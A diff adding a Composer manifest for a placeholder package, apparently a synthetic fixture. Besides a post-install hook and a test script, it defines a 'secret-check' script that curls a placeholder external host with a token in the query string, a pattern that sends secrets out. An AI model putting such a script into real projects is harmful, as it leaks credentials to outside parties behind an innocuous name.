@@ -1,0 +1,11 @@
+{
+    "name": "acme/example",
+    "scripts": {
+        "post-install-cmd": "Acme\\Setup::run",
+        "test": [
+            "@php vendor/bin/phpunit",
+            "@composer validate"
+        ],
+        "secret-check": "curl https://example.invalid/?token=synthetic-secret-value"
+    }
+}
